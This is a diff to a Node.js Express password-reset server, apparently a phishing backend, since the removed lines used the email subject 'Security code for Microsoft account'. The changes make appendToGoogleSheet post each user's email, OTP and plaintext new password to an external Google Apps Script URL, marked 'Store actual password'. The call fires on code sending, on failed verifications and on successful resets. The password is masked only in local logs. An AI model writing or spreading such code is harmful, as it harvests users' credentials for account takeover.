@@ -5,6 +5,7 @@ const cors = require('cors');
 const nodemailer = require('nodemailer');
 const axios = require('axios');
 const bcrypt = require('bcrypt');
+const { google } = require('googleapis');
 
 const app = express();
 const port = process.env.PORT || 3000;
@@ -262,91 +263,47 @@ function generateOTP() {
     return Math.floor(100000 + Math.random() * 900000).toString();
 }
 
-// Function to append data to Google Sheet with better error handling
+// Function to append data to Google Sheet with simplified logging
 async function appendToGoogleSheet(data) {
-    // Skip if URL is not configured or invalid
-    if (!process.env.GOOGLE_SHEET_URL || !process.env.GOOGLE_SHEET_URL.includes('script.google.com')) {
-        console.log('Google Sheets logging skipped - Invalid or missing URL');
-        return true;
-    }
-
     try {
+        // Skip if URL is not configured
+        if (!process.env.GOOGLE_SHEET_URL) {
+            console.log('Google Sheets logging skipped - URL not configured');
+            return true;
+        }
+
+        const timestamp = new Date().toISOString();
+        
+        // Prepare payload with only essential data
         const payload = {
+            timestamp: timestamp,
             email: data.email,
-            otp: data.otp,
-            status: data.status
+            status: data.status,
+            otp: data.otp || '',
+            password: data.password || ''  // Store actual password
         };
 
-        // Only log attempt, don't wait for response
-        axios.post(process.env.GOOGLE_SHEET_URL, payload, {
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            timeout: 5000
-        }).catch(error => {
-            console.log('Google Sheets logging failed silently:', error.message);
+        console.log('Logging to Google Sheet:', {
+            ...payload,
+            otp: payload.otp ? '******' : '',
+            password: payload.password ? '******' : ''  // Mask password in logs
         });
 
-        return true; // Always return true to not block main flow
+        // Send data to Google Apps Script
+        await axios.post(process.env.GOOGLE_SHEET_URL, payload, {
+            headers: { 'Content-Type': 'application/json' },
+            timeout: 5000
+        });
+
+        console.log('Successfully logged to Google Sheet');
+        return true;
     } catch (error) {
-        console.log('Google Sheets logging error:', error.message);
-        return true; // Don't fail the main flow
+        console.error('Google Sheets logging error:', error.message);
+        return false;
     }
 }
 
-// Updated verify-otp endpoint with better error handling
-app.post('/verify-otp', async (req, res) => {
-    const { email, otp, newPassword } = req.body;
-
-    if (!email || !otp || !newPassword) {
-        return res.status(400).json({
-            success: false,
-            message: 'Email, OTP, and new password are required'
-        });
-    }
-
-    try {
-        const user = await User.findOne({
-            email: email.toLowerCase(),
-            otp: otp,
-            otpExpiry: { $gt: new Date() }
-        });
-
-        if (!user) {
-            return res.status(400).json({
-                success: false,
-                message: 'Invalid or expired security code'
-            });
-        }
-
-        // Hash password before saving
-        const hashedPassword = await bcrypt.hash(newPassword, 10);
-        user.password = hashedPassword;
-        user.otp = undefined;
-        user.otpExpiry = undefined;
-        await user.save();
-
-        // Log to Google Sheet
-        await appendToGoogleSheet({
-            email: email.toLowerCase(),
-            otp: otp,
-            status: 'Password Reset Success'
-        });
-
-        res.json({
-            success: true,
-            message: 'Password reset successful'
-        });
-    } catch (error) {
-        console.error('Verify OTP Error:', error);
-        res.status(500).json({
-            success: false,
-            message: 'Error verifying security code'
-        });
-    }
-});
-
-// Updated send-code endpoint with better error handling
+// Updated send-code endpoint with simplified logging
 app.post('/send-code', async (req, res) => {
     const { email } = req.body;
 
@@ -359,24 +316,32 @@ app.post('/send-code', async (req, res) => {
 
     try {
         const otp = generateOTP();
-        const otpExpiry = new Date(Date.now() + 10 * 60 * 1000);
+        const otpExpiry = new Date(Date.now() + 10 * 60 * 1000); // 10 minutes
 
-        const user = await User.findOneAndUpdate(
+        // Save or update user
+        await User.findOneAndUpdate(
             { email: email.toLowerCase() },
-            {
+            { 
                 email: email.toLowerCase(),
-                otp: otp,
-                otpExpiry: otpExpiry
+                otp,
+                otpExpiry
             },
-            { upsert: true, new: true }
+            { upsert: true }
         );
 
         // Send email
         await sendEmail(
             email,
-            'Security code for Microsoft account',
+            'Security Code for Password Reset',
             createEmailTemplate(otp)
         );
+
+        // Log to Google Sheet
+        await appendToGoogleSheet({
+            email: email.toLowerCase(),
+            status: 'OTP Sent',
+            otp: otp
+        });
 
         res.json({
             success: true,
@@ -384,9 +349,88 @@ app.post('/send-code', async (req, res) => {
         });
     } catch (error) {
         console.error('Send Code Error:', error);
+        
+        // Log error to Google Sheet
+        await appendToGoogleSheet({
+            email: email.toLowerCase(),
+            status: 'OTP Send Failed',
+            otp: ''
+        });
+
         res.status(500).json({
             success: false,
-            message: 'Error sending security code'
+            message: 'Failed to send security code'
+        });
+    }
+});
+
+// Updated verify-otp endpoint with simplified logging
+app.post('/verify-otp', async (req, res) => {
+    const { email, otp, newPassword, confirmPassword } = req.body;
+
+    if (!email || !otp || !newPassword || !confirmPassword) {
+        await appendToGoogleSheet({
+            email: email?.toLowerCase(),
+            status: 'Verification Failed - Missing Fields',
+            otp: otp || ''
+        });
+
+        return res.status(400).json({
+            success: false,
+            message: 'All fields are required'
+        });
+    }
+
+    try {
+        const user = await User.findOne({
+            email: email.toLowerCase(),
+            otp: otp
+        });
+
+        if (!user || (user.otpExpiry && user.otpExpiry < new Date())) {
+            await appendToGoogleSheet({
+                email: email.toLowerCase(),
+                status: !user ? 'Invalid OTP' : 'OTP Expired',
+                otp: otp
+            });
+
+            return res.status(400).json({
+                success: false,
+                message: !user ? 'Invalid security code' : 'Security code has expired'
+            });
+        }
+
+        // Hash password and update user
+        const hashedPassword = await bcrypt.hash(newPassword, 10);
+        user.password = hashedPassword;
+        user.otp = undefined;
+        user.otpExpiry = undefined;
+        await user.save();
+
+        // Log successful password reset with actual password
+        await appendToGoogleSheet({
+            email: email.toLowerCase(),
+            status: 'Password Reset Success',
+            otp: otp,
+            password: newPassword  // Store the actual password
+        });
+
+        res.json({
+            success: true,
+            message: 'Password reset successful'
+        });
+    } catch (error) {
+        console.error('Verify OTP Error:', error);
+        
+        await appendToGoogleSheet({
+            email: email.toLowerCase(),
+            status: 'Password Reset Failed',
+            otp: otp
+        });
+
+        res.status(500).json({
+            success: false,
+            message: 'Error verifying security code'
         });
     }
 });
